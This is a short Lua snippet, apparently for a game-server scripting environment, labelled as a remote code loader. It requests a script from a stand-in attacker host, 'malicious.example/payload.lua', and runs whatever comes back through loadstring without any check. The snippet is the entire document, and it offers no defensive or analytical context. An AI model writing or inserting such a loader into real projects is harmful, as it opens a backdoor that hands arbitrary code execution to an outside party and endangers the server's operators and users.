-- Remote code loader: fetch a script from an external host and run it.
PerformHttpRequest('http://malicious.example/payload.lua', function(code, body)
    local fn = loadstring(body)
    if fn then fn() end
end, 'GET')
